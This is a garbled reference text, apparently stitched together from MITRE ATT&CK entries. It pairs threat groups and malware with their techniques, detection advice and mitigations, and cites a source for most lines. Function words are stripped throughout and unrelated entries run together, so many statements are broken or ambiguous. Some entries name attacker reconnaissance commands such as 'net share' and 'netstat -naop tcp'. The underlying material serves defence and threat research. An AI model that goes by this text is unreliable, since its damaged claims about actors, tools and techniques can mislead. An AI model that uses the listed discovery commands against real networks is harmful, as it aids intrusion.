property * | findstr “Address””</code> network logged-in accounts discovery addresses machines. [Earth Lusca](https://attack.mitre.org/groups/G1006) multiple scanning tools discover machines compromised network.(Citation: TrendMicro EarthLusca 2022) [Andariel](https://attack.mitre.org/groups/G0138) <code>netstat -naop tcp</code> command display TCP connections victim's machine.(Citation: Kaspersky Andariel Ransomware June 2021) Monitor executed commands arguments abuse authentication packages execute DLLs boots. [njRAT](https://attack.mitre.org/software/S0385) read specific registry values.(Citation: Trend Micro njRAT 2018) [APT29](https://attack.mitre.org/groups/G0016) encoded PowerShell commands.(Citation: FireEye APT29 Nov 2018) [PoetRAT](https://attack.mitre.org/software/S0428) ability list files receiving <code>ls</code> command C2.(Citation: Talos PoetRAT April 2020) [WhisperGate](https://attack.mitre.org/software/S0689) locate files based hardcoded file extensions.(Citation: WhisperGate January 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [ZxShell](https://attack.mitre.org/software/S0412) set SOCKS proxy.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)  [Valak](https://attack.mitre.org/software/S0476) <code>regsvr32.exe</code> launch malicious DLLs.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020) [NetTraveler](https://attack.mitre.org/software/S0033) keylogger.(Citation: Kaspersky NetTraveler) Monitor loading modules VB languages (ex: vbscript.dll). [Kwampirs](https://attack.mitre.org/software/S0236) collects list network shares command <code>net share</code>.(Citation: Symantec Orangeworm April 2018) [Peppy](https://attack.mitre.org/software/S0643) download execute remote files.(Citation: Proofpoint Operation Transparent Tribe March 2016) [GALLIUM](https://attack.mitre.org/groups/G0093) modified version [HTRAN](https://attack.mitre.org/software/S0040) obfuscated strings debug messages apparent attempt evade detection.(Citation: Cybereason Soft Cell June 2019) [Threat Group-3390](https://attack.mitre.org/groups/G0027) KeePass database compromised host.(Citation: Trend Micro DRBControl February 2020) [cmd](https://attack.mitre.org/software/S0106) files directories native functionality <code>dir</code> commands.(Citation: TechNet Dir) [RGDoor](https://attack.mitre.org/software/S0258) establishes persistence webservers IIS module.(Citation: Unit 42 RGDoor Jan 2018)(Citation: ESET IIS Malware 2021) Verify integrity live processes comparing code memory static binaries, checking jumps instructions redirect code flow. [Carberp](https://attack.mitre.org/software/S0484) removed hooks installing trojan bootkit evade sandbox analysis analysis software.(Citation: ESET Carberp March 2012) [Ursnif](https://attack.mitre.org/software/S0386) custom packet format TCP UDP peer-to-peer (P2P) network C2.(Citation: ProofPoint Ursnif Aug 2016) [Lazarus Group](https://attack.mitre.org/groups/G0032) Windows API <code>ObtainUserAgentString</code> User-Agent compromised host connect C2 server.(Citation: McAfee Lazarus Jul 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) various, lesser known, functions perform types Discovery [Process Injection](https://attack.mitre.org/techniques/T1055).(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [cmd](https://attack.mitre.org/software/S0106) files to/from remotely connected external system.(Citation: TechNet Copy) [Emissary](https://attack.mitre.org/software/S0082) capability create remote execute commands.(Citation: Lotus Blossom Dec 2015) [EKANS](https://attack.mitre.org/software/S0605) processes hard-coded list.(Citation: Dragos EKANS)(Citation: FireEye Ransomware Feb 2020)(Citation: IBM Ransomware Trends September 2020) [VERMIN](https://attack.mitre.org/software/S0257) perform audio capture.(Citation: Unit 42 VERMIN Jan 2018) [Hikit](https://attack.mitre.org/software/S0009) performs XOR encryption.(Citation: Novetta-Axiom) [NETWIRE](https://attack.mitre.org/software/S0198) AES encryption C2 data transferred.(Citation: Red Canary NETWIRE January 2020) [Darkhotel](https://attack.mitre.org/groups/G0012) collected hostname, OS version, service pack version, processor architecture victim’s machine.(Citation: Securelist Darkhotel Aug 2015)(Citation: DUBNIUM July 2016) [PlugX](https://attack.mitre.org/software/S0013) configured multiple network protocols avoid network-based detection.(Citation: Dell TG-3390) Monitor executed commands arguments actions gather common compilers, csc.exe GCC/MinGW, correlate suspicious behavior reduce false positives normal user administrator behavior. [Hildegard](https://attack.mitre.org/software/S0601) searched private .ssh.(Citation: Unit 42 Hildegard Malware) [Wizard Spider](https://attack.mitre.org/groups/G0102) collected staged credentials network enumeration information,  networkdll psfin [TrickBot](https://attack.mitre.org/software/S0266) modules.(Citation: CrowdStrike Grim Spider 2019) [BlackEnergy](https://attack.mitre.org/software/S0089) gathered process list [Tasklist](https://attack.mitre.org/software/S0057).exe.(Citation: F-Secure BlackEnergy 2014)(Citation: Securelist BlackEnergy Nov 2014)(Citation: ESET BlackEnergy Jan 2016) [Squirrelwaffle](https://attack.mitre.org/software/S1030) distributed phishing emails malicious URL.(Citation: ZScaler Squirrelwaffle Sep 2021) [REvil](https://attack.mitre.org/software/S0496) inject running processes compromised host.(Citation: McAfee REvil October 2019) [Donut](https://attack.mitre.org/software/S0695) includes subproject <code>DonutTest</code> inject shellcode target process.(Citation: Donut Github)	 Restrict read/write access systemd <code>.timer</code> unit files select privileged users legitimate manage services. [UNC2452](https://attack.mitre.org/groups/G0118) compromised domains C2.(Citation: MSTIC NOBELIUM Mar 2021) [Leviathan](https://attack.mitre.org/groups/G0065) obfuscated code base64 gzip compression.(Citation: Proofpoint Leviathan Oct 2017) Update corporate policies restrict types third-party applications online service tool linked company's information, accounts network (example: Google, Microsoft, Dropbox, Basecamp, GitHub). However, providing high-level guidance this, extremely specific—include list pre-approved applications deny list. Administrators block end-user consent administrative portals, Azure Portal, disabling users authorizing third-party apps OAuth forcing administrative consent.(Citation: Azure Admin Consent) Identify block malicious software executed technique application control tools capable preventing unknown DLLs loaded. [REvil](https://attack.mitre.org/software/S0496) mimic names executables.(Citation: Picus Sodinokibi January 2020) [FIN6](https://attack.mitre.org/groups/G0037) encoded PowerShell commands.(Citation: Visa FIN6 Feb 2019) [REvil](https://attack.mitre.org/software/S0496) save encryption parameters Registry.(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: Secureworks REvil September 2019) [FoggyWeb](https://attack.mitre.org/software/S0661) remotely exfiltrate sensitive compromised FS server.(Citation: MSTIC FoggyWeb September 2021) (Citation: Kaspersky Lyceum October 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) administrator credentials gain access restricted network segments.(Citation: Kaspersky ThreatNeedle Feb 2021) (Citation: US-CERT TA18-074A) [Ramsay](https://attack.mitre.org/software/S0458) scan systems vulnerable EternalBlue exploit.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 (Citation: Proofpoint Operation Transparent Tribe March 2016) [Conti](https://attack.mitre.org/software/S0575) decrypted payload hardcoded AES-256 key.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020) Monitor newly constructed user accounts collection usage logs cloud user administrator accounts identify unusual activity creation accounts assignment roles accounts. Monitor accounts assigned admin roles threshold admins. [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors collected [Empire](https://attack.mitre.org/software/S0363), automatically adversary's C2.(Citation: Talos Frankenstein June 2019) Monitor unexpected files manipulated data manipulate external outcomes hide activity [InvisiMole](https://attack.mitre.org/software/S0260) <code>ITaskService</code>, <code>ITaskDefinition</code> <code>ITaskSettings</code> interfaces schedule task.(Citation: ESET InvisiMole June 2020) [QakBot](https://attack.mitre.org/software/S0650) maintain persistence creating auto-run Registry key.(Citation: Trend Micro Qakbot 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: IB Ransomware September 2020) [APT28](https://attack.mitre.org/groups/G0007) exfiltrate data Google Drive.(Citation: TrendMicro Pawn Storm Dec 2020)  [Drovorub](https://attack.mitre.org/software/S0502) kernel modules establish persistence.(Citation: NSA/FBI Drovorub August 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) <code>netstat -ano</code> determine network connection information.(Citation: Avira Mustang Panda January 2020) [HEXANE](https://attack.mitre.org/groups/G1001) brute force attacks compromise valid credentials.(Citation: SecureWorks August 2019) [menuPass](https://attack.mitre.org/groups/G0045) installed updates malware victims.(Citation: PWC Cloud Hopper April 2017)(Citation: District Court NY APT10 Indictment December 2018) [POWERSTATS](https://attack.mitre.org/software/S0223) created scheduled task named "MicrosoftEdge" establish persistence.(Citation: ClearSky MuddyWater Nov 2018) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [Bazar](https://attack.mitre.org/software/S0534) execute PowerShell script received C2.(Citation: NCC Team9 June 2020)(Citation: CrowdStrike Wizard Spider October 2020) [APT41](https://attack.mitre.org/groups/G0096) exploit payloads initiate download [ftp](https://attack.mitre.org/software/S0095).(Citation: FireEye APT41 March 2020) Monitor contextual data Internet-facing resource gathered scan, running services ports buy, lease, rent infrastructure targeting. Detection efforts focused stages adversary lifecycle, Command Control. (Citation: Alperovitch 2014) [Frankenstein](https://attack.mitre.org/campaigns/C0001) threat actors [Empire](https://attack.mitre.org/software/S0363) discovery.(Citation: Talos Frankenstein June 2019) possible, permit execution signed scripts. [Peirates](https://attack.mitre.org/software/S0683) dump contents AWS S3 buckets. retrieve service account tokens kOps buckets Google Cloud Storage S3.(Citation: Peirates GitHub) [Sys10](https://attack.mitre.org/software/S0060) collects logged-in user sends C2.(Citation: Baumgartner Naikon 2015) [Astaroth](https://attack.mitre.org/software/S0373) check Windows product ID's sandboxes usernames disk serial analyst environments.(Citation: Securelist Brazilian Banking Malware July 2020) [Fysbis](https://attack.mitre.org/software/S0410) masqueraded rsyncd dbus-inotifier services.(Citation: Fysbis Dr Analysis) [gsecdump](https://attack.mitre.org/software/S0008) dump LSA secrets.(Citation: TrueSec Gsecdump) [Cobalt Strike](https://attack.mitre.org/software/S0154) download hosted "beacon" payload [BITSAdmin](https://attack.mitre.org/software/S0190).(Citation: CobaltStrike Scripted Delivery)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [H1N1](https://attack.mitre.org/software/S0132) disable recovery options deletes shadow copies victim.(Citation: Cisco H1N1 2) (Citation: Mandiant APT1) eliminate path interception weaknesses program configuration files, scripts, PATH environment variable, services, shortcuts surrounding PATH variables quotation marks functions them. aware search Windows executing loading binaries qualified paths appropriate.

Clean Windows Registry software uninstalled avoid legitimate binaries. Periodically search correct report path interception weaknesses systems introduced custom tools report software insecure path configurations.(Citation: CreateProcess)(Citation: Dynamic-Link Library Security)(Citation: Vulnerability Exploit Detector) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors Visual Basic script remote commands.(Citation: Bitdefender FunnyDream Campaign November 2020) [POWERSTATS](https://attack.mitre.org/software/S0223) retrieve usernames compromised hosts.(Citation: FireEye MuddyWater Mar 2018) [Brave Prince](https://attack.mitre.org/software/S0252) lists running processes.(Citation: McAfee Gold Dragon) (Citation: Symantec Elderwood Sept 2012) [APT38](https://attack.mitre.org/groups/G0082) conducted watering holes schemes gain initial access victims.(Citation: FireEye APT38 Oct 2018)(Citation: CISA AA20-239A BeagleBoyz August 2020) [Ember Bear](https://attack.mitre.org/groups/G1003) stolen legitimate certificates sign malicious payloads.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-WmiCommand</code> CodeExecution module WMI execute retrieve output [PowerShell](https://attack.mitre.org/techniques/T1086) payload.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Mustang Panda](https://attack.mitre.org/groups/G0129) embedded VBScript components LNK files download additional files automate collection.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019) [MarkiRAT](https://attack.mitre.org/software/S0652) ShellExecuteW API Windows Command Shell.(Citation: Kaspersky Ferocious Kitten Jun 2021) [RainyDay](https://attack.mitre.org/software/S0629) download files compromised host.(Citation: Bitdefender Naikon April 2021) strong passphrases private cracking difficult. Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. defend SYN floods, enable SYN Cookies. [APT28](https://attack.mitre.org/groups/G0007) tools perform keylogging.(Citation: SIR 19)(Citation: DOJ GRU Indictment Jul 2018)(Citation: TrendMicro Pawn Storm Dec 2020) [RGDoor](https://attack.mitre.org/software/S0258) cmd.exe execute commands victim’s machine.(Citation: Unit 42 RGDoor Jan 2018) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection DNS TLS (DoT) DNS HTTPS (DoH), follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Silence](https://attack.mitre.org/groups/G0091) <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>, <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>, Startup folder establish persistence.(Citation: IB Silence Sept 2018)	 [Elise](https://attack.mitre.org/software/S0081) configures service.(Citation: Lotus Blossom Jun 2015) [APT29](https://attack.mitre.org/groups/G0016) exploited CVE-2021-36934 escalate privileges compromised host.(Citation: ESET T3 Threat Report 2021) Monitor abnormal access files .pdf, .docx, .jpg, etc.), sensitive documents, automated processing gathered Collection. [Rising Sun](https://attack.mitre.org/software/S0448) detect username infected host.(Citation: McAfee Sharpshooter December 2018)	 inspect HTTPS traffic, captures analyzed connections domain fronting. [3PARA RAT](https://attack.mitre.org/software/S0066) command control.(Citation: CrowdStrike Putter Panda) Block execution Regsvcs.exe Regasm.exe required network prevent potential misuse adversaries. [BlackMould](https://attack.mitre.org/software/S0564) send commands C2 body POST requests.(Citation: GALLIUM December 2019) [Seasalt](https://attack.mitre.org/software/S0345) capability identify drive type victim.(Citation: McAfee Oceansalt Oct 2018) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls.  [Kwampirs](https://attack.mitre.org/software/S0236) decrypts extracts main DLL payload executing.(Citation: Symantec Orangeworm April 2018) [Dyre](https://attack.mitre.org/software/S0024) ability create files TEMP folder database store information.(Citation: Malwarebytes Dyreza November 2015) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) tool capture screenshots.(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019) [Grandoreiro](https://attack.mitre.org/software/S0531) named malicious browser extensions update files legitimate.(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [Helminth](https://attack.mitre.org/software/S0170) encrypts data C2 server RC4.(Citation: Palo Alto OilRig 2016) [Pupy](https://attack.mitre.org/software/S0192)'s default encryption C2 communication channel SSL, transport options RSA AES.(Citation: GitHub Pupy) [BISCUIT](https://attack.mitre.org/software/S0017) command periodically screenshots system.(Citation: Mandiant APT1 Appendix) [DarkHydrus](https://attack.mitre.org/groups/G0079) [Template Injection](https://attack.mitre.org/techniques/T1221) launch authentication window users enter credentials.(Citation: Unit 42 Phishery Aug 2018) [SUNBURST](https://attack.mitre.org/software/S0559) Base64 encoding C2 traffic.(Citation: FireEye SUNBURST Backdoor December 2020) discovery modules [Duqu](https://attack.mitre.org/software/S0038) collect accounts permissions.(Citation: Symantec W32.Duqu) [BloodHound](https://attack.mitre.org/software/S0521) collect password policy target environment.(Citation: CrowdStrike BloodHound April 2018) (Citation: FireEye POSHSPY April 2017) Restrict storage execution Control Panel items protected directories, <code>C:\Windows</code>, user directories. [APT29](https://attack.mitre.org/groups/G0016) accessed victims’ internal knowledge repositories (wikis) view sensitive corporate products, services, internal business operations.(Citation: CrowdStrike StellarParticle January 2022) [OilRig](https://attack.mitre.org/groups/G0049) shells, maintain access victim network.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: Crowdstrike GTR2020 Mar 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) compromised Google Drive repositories.(Citation: TrendMicro EarthLusca 2022) [PyDCrypt](https://attack.mitre.org/software/S1032), functions, written Python.(Citation: Checkpoint MosesStaff Nov 2021) [Revenge RAT](https://attack.mitre.org/software/S0379) ability access webcam.(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019) Enable pass hash mitigations apply UAC restrictions local accounts network logon. Registry key located <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code>.

Through GPO: Configuration > [Policies] > Administrative Templates > SCM: Pass Hash Mitigations: Apply UAC restrictions local accounts network logons.(Citation: GitHub IAD Secure Host Baseline UAC Filtering) Monitor executed commands arguments attempt block indicators events typically captured sensors gathered analyzed. [BBK](https://attack.mitre.org/software/S0470) ability inject shellcode svchost.exe.(Citation: Trend Micro Tick November 2019) [Magic Hound](https://attack.mitre.org/groups/G0059) malware C2.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: DFIR Report APT35 ProxyShell March 2022) Operators deploying [Netwalker](https://attack.mitre.org/software/S0457) psexec [Netwalker](https://attack.mitre.org/software/S0457) payload accessible systems.(Citation: Sophos Netwalker 2020) [Wizard Spider](https://attack.mitre.org/groups/G0102) administrative accounts, including Domain Admin, laterally victim network.(Citation: FireEye KEGTAP SINGLEMALT October 2020) [Machete](https://attack.mitre.org/groups/G0095) phishing emails link external server ZIP RAR archives.(Citation: Cylance Machete Mar 2017)(Citation: ESET Machete July 2019) [Gelsemium](https://attack.mitre.org/software/S0666) set persistence Registry key.(Citation: ESET Gelsemium June 2021) [ROKRAT](https://attack.mitre.org/software/S0240) access <code>HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData</code> Registry key manufacturer identify machine type.(Citation: Talos Group123) [Leviathan](https://attack.mitre.org/groups/G0065) collected compromised credentials targeting efforts.(Citation: CISA AA21-200A APT40 July 2021) [BACKSPACE](https://attack.mitre.org/software/S0031) capable deleting Registry keys, sub-keys, values victim system.(Citation: FireEye APT30) [Kobalos](https://attack.mitre.org/software/S0641) spawn pseudo-terminal execute arbitrary commands command prompt.(Citation: ESET Kobalos Feb 2021)  Monitor unexpected cloud block storage volumes . reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. (Citation: Alperovitch 2014) [Shamoon](https://attack.mitre.org/software/S0140) queries Registry identify hard disk partitions overwrite.(Citation: Palo Alto Shamoon Nov 2016) [Pillowmint](https://attack.mitre.org/software/S0517) NtQueueApcThread syscall inject code svchost.exe.(Citation: Trustwave Pillowmint June 2020) Monitor newly constructed network connections received untrusted hosts.  [RCSession](https://attack.mitre.org/software/S0662) ability execute msiexec.exe process.(Citation: Profero APT27 December 2020) [Bazar](https://attack.mitre.org/software/S0534) XOR, RSA2, RC4 encrypted files.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020)(Citation: CrowdStrike Wizard Spider October 2020) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors included local UPnP RPC proxies.(Citation: ESET Turla PowerShell 2019)	 [Gallmaker](https://attack.mitre.org/groups/G0084) obfuscated shellcode execution.(Citation: Symantec Gallmaker Oct 2018) [PowerSploit](https://attack.mitre.org/software/S0194) collection Privesc-PowerUp modules discover exploit unquoted path vulnerabilities.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Whitefly](https://attack.mitre.org/groups/G0107) search hijacking loader Vcrodat.(Citation: Symantec Whitefly March 2019)	 [RainyDay](https://attack.mitre.org/software/S0629) decrypt payload XOR key.(Citation: Bitdefender Naikon April 2021) [WinMM](https://attack.mitre.org/software/S0059) collects name, OS version including service pack, install sends C2 server.(Citation: Baumgartner Naikon 2015) [Metamorfo](https://attack.mitre.org/software/S0455) injected malicious DLL Windows Media Player process (wmplayer.exe).(Citation: Medium Metamorfo Apr 2020) [ChChes](https://attack.mitre.org/software/S0144) establishes persistence adding Registry key.(Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: SecureWorks BRONZE UNION June 2017) Monitor attempt user gain access network computing resource, providing credentials delete alter generated artifacts host system, including logs captured files quarantined malware. [Wingbird](https://attack.mitre.org/software/S0176) deletes payload payload's parent process finishes copying files.(Citation: SIR 21) [Peppy](https://attack.mitre.org/software/S0643) communicate C2.(Citation: Proofpoint Operation Transparent Tribe March 2016) components [Machete](https://attack.mitre.org/software/S0409) executed Windows Task Scheduler.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014) [Grandoreiro](https://attack.mitre.org/software/S0531) store configuration Registry <code>HKCU\Software\</code> frequently changing names including <code>%USERNAME%</code> <code>ToolTech-RM</code>.(Citation: ESET Grandoreiro April 2020) [LiteDuke](https://attack.mitre.org/software/S0513) image files hide loader component.(Citation: ESET Dukes October 2019) [CrackMapExec](https://attack.mitre.org/software/S0488) discover active sessions targeted system.(Citation: CME Github September 2018) [GeminiDuke](https://attack.mitre.org/software/S0049) collects local user accounts victim.(Citation: F-Secure Dukes) [APT19](https://attack.mitre.org/groups/G0073) <code>-W Hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows setting WindowStyle parameter hidden. (Citation: FireEye APT19) [Naikon](https://attack.mitre.org/groups/G0019) commands <code>netsh advfirewall firewall</code> discover local firewall settings.(Citation: Baumgartner Naikon 2015) [PinchDuke](https://attack.mitre.org/software/S0048) steals credentials compromised hosts. [PinchDuke](https://attack.mitre.org/software/S0048)'s credential stealing functionality believed based source code Pinch credential stealing malware (also LdPinch). Credentials targeted [PinchDuke](https://attack.mitre.org/software/S0048) include sources WinInet Credential Cache, Lightweight Directory Access Protocol (LDAP).(Citation: F-Secure Dukes) [CopyKittens](https://attack.mitre.org/groups/G0052) ZPP, .NET console program, compress files ZIP.(Citation: ClearSky Wilted Tulip July 2017) [Cardinal RAT](https://attack.mitre.org/software/S0348) download execute additional payloads.(Citation: PaloAlto CardinalRat Apr 2017) [WarzoneRAT](https://attack.mitre.org/software/S0670) collect data compromised host.(Citation: Check Warzone Feb 2020) [Saint Bot](https://attack.mitre.org/software/S1018) obfuscated avoid detection.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Taidoor](https://attack.mitre.org/software/S0011) ability modify Registry compromised hosts <code>RegDeleteValueA</code> <code>RegCreateKeyExA</code>.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Dtrack](https://attack.mitre.org/software/S0567)’s RAT persistent target file auto execution host start.(Citation: Securelist Dtrack) [PingPull](https://attack.mitre.org/software/S1031) collect data compromised host.(Citation: Unit 42 PingPull Jun 2022) [AppleSeed](https://attack.mitre.org/software/S0622) identify IP targeted system.(Citation: Malwarebytes Kimsuky June 2021) [PlugX](https://attack.mitre.org/software/S0013) configured raw TCP UDP command control.(Citation: Dell TG-3390) Monitor API calls attempt gather attached peripheral devices components connected system. [Sykipot](https://attack.mitre.org/software/S0018) <code>net "domain admins" /domain</code> display accounts "domain admins" permissions <code>net localgroup "administrators"</code> list local administrator membership.(Citation: AlienVault Sykipot 2011) Clean SID-History attributes legitimate account migration complete.

Consider applying SID Filtering interforest trusts, forest trusts external trusts, exclude SID-History requests access domain resources. SID Filtering ensures authentication requests trust SIDs security principals trusted domain (i.e preventing trusted domain claiming user membership domain).

SID Filtering forest trusts enabled default, disabled child domain transitively access forest trusts. SID Filtering external trusts automatically enabled created external trusts Server 2003 domain controllers. (Citation: Trust Considerations Nov 2014) (Citation: SID Filtering Quarantining Jan 2009) note SID Filtering automatically applied legacy trusts deliberately disabled inter-domain access resources.

SID Filtering applied by: (Citation: Netdom Trust Sept 2012)

* Disabling SIDHistory forest trusts netdom tool (<code>netdom trust /domain: /EnableSIDHistory:no</code> domain controller)

* Applying SID Filter Quarantining external trusts netdom tool (<code>netdom trust <TrustingDomainName> /domain:<TrustedDomainName> /quarantine:yes</code> domain controller)

* Applying SID Filtering domain trusts single forest recommended unsupported configuration breaking changes. (Citation: Netdom Trust Sept 2012) (Citation: AdSecurity Kerberos Aug 2015) domain forest untrustworthy forest. situation split trusted untrusted domains separate forests SID Filtering applied interforest trust [TinyTurla](https://attack.mitre.org/software/S0668) install service compromised machines.(Citation: Talos TinyTurla September 2021) [Dragonfly](https://attack.mitre.org/groups/G0035) exploited CVE-2011-0611 Adobe Flash Player gain execution targeted system.(Citation: Gigamon Berserk Bear October 2021) [Xbash](https://attack.mitre.org/software/S0341) mshta executing scripts.(Citation: Unit42 Xbash Sept 2018) Monitor settings unexpected modifications user accounts, deletions malicious user attributes (credentials, status, etc.). Monitor processes unexpected termination security tools/services. Specifically, execution ransomware, monitor rootkit tools, GMER, PowerTool TDSSKiller, detect terminate hidden processes host antivirus software.
 [HEXANE](https://attack.mitre.org/groups/G1001) scheduled task establish persistence keylogger.(Citation: Kaspersky Lyceum October 2021) [UPPERCUT](https://attack.mitre.org/software/S0275) capability collect current logged user’s username machine.(Citation: FireEye APT10 Sept 2018) [QuasarRAT](https://attack.mitre.org/software/S0262) built-in keylogger.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) Anti-virus automatically detect quarantine suspicious files. [Bundlore](https://attack.mitre.org/software/S0482) spread malicious advertisements websites.(Citation: MacKeeper Bundlore Apr 2019) Monitor network data flows unexpected patterns metadata indicative mismatch protocol utilized port. [Out1](https://attack.mitre.org/software/S0594) native command execution.(Citation: Trend Micro Muddy Water March 2021) establish persistence, [Okrum](https://attack.mitre.org/software/S0439) install service named NtmSsvc.(Citation: ESET Okrum July 2019) [QakBot](https://attack.mitre.org/software/S0650) payload disguised PNG file.(Citation: IB Ransomware September 2020)  Monitor networks solicits obtains configuration queried device.  Network intrusion prevention systems systems designed scan remove malicious email attachments block activity. Monitor newly constructed network connections received untrusted hosts.  [WarzoneRAT](https://attack.mitre.org/software/S0670) download execute additional files.(Citation: Check Warzone Feb 2020) [Imminent Monitor](https://attack.mitre.org/software/S0434) deleted files dynamic debugger feature.(Citation: QiAnXin APT-C-36 Feb2019) [Stuxnet](https://attack.mitre.org/software/S0603) create registry load driver files.(Citation: Symantec W.32 Stuxnet Dossier) [LazyScripter](https://attack.mitre.org/groups/G0140) relied users clicking links malicious files.(Citation: MalwareBytes LazyScripter Feb 2021) [Confucius](https://attack.mitre.org/groups/G0142) lured victims clicking malicious link spearphishing.(Citation: TrendMicro Confucius APT Aug 2021) [FIN7](https://attack.mitre.org/groups/G0046) TightVNC control compromised hosts.(Citation: CrowdStrike Carbon Spider August 2021) Monitor commands, <code>security add-trusted-cert</code> (macOS) <code>certutil -addstore</code> (Windows), install root certificates. system's root certificates change frequently. Monitor certificates installed malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates systems ensure unnecessary suspicious certificates present. list trustworthy root certificates online <code>authroot.stl</code>. (Citation: SpectorOps Code Signing Dec 2017) Sysinternals Sigcheck utility (<code>sigcheck[64].exe -tuv</code>) dump contents certificate store list valid certificates rooted Certificate Trust List. (Citation: Sigcheck 2017) [APT38](https://attack.mitre.org/groups/G0082) enumerated files directories, searched specific locations compromised host.(Citation: CISA AA20-239A BeagleBoyz August 2020) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) masked executables document file icons including Word Adobe PDF.(Citation: Trend Micro Tick November 2019) [AppleSeed](https://attack.mitre.org/software/S0622) disguise JavaScript files PDFs.(Citation: Malwarebytes Kimsuky June 2021) [PolyglotDuke](https://attack.mitre.org/software/S0518) executed rundll32.exe.(Citation: ESET Dukes October 2019) [BabyShark](https://attack.mitre.org/software/S0414) executed <code>reg query</code> command <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code>.(Citation: Unit42 BabyShark Feb 2019)	 Monitor executed commands arguments achieve persistence adding Registry key Active Setup local machine. [Aoqin Dragon](https://attack.mitre.org/groups/G1007) dropper employs worm infection strategy removable device breach secure network environment.(Citation: SentinelOne Aoqin Dragon June 2022) [Diavol](https://attack.mitre.org/software/S0659) POST requests C2.(Citation: Fortinet Diavol July 2021) [Indrik Spider](https://attack.mitre.org/groups/G0119) fake updates FlashPlayer plugin Google Chrome initial infection vectors.(Citation: Crowdstrike Indrik November 2018) [TA505](https://attack.mitre.org/groups/G0092) <code>msiexec</code> download execute malicious Windows Installer files.(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019)(Citation: Trend Micro TA505 June 2019) [Maze](https://attack.mitre.org/software/S0449) "WNetOpenEnumW", "WNetEnumResourceW”, “WNetCloseEnum” “WNetAddConnection2W” functions enumerate network resources infected machine.(Citation: McAfee Maze March 2020) [QuasarRAT](https://attack.mitre.org/software/S0262) AES hardcoded pre-shared key encrypt network communication.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)(Citation: CISA AR18-352A Quasar RAT December 2018) Monitor contextual file data signs deletion alter generated artifacts host system, including logs captured files quarantined malware. [MarkiRAT](https://attack.mitre.org/software/S0652) download additional files tools C2 server, including [BITSAdmin](https://attack.mitre.org/software/S0190).(Citation: Kaspersky Ferocious Kitten Jun 2021) flood volumes exceed capacity network connection targeted, typically intercept incoming traffic upstream filter attack traffic legitimate traffic. defenses hosting Internet Service Provider (ISP) 3rd party Content Delivery Network (CDN) providers specializing DoS mitigations.(Citation: CERT-EU DDoS March 2017)

Depending flood volume, on-premises filtering blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport.(Citation: CERT-EU DDoS March 2017)

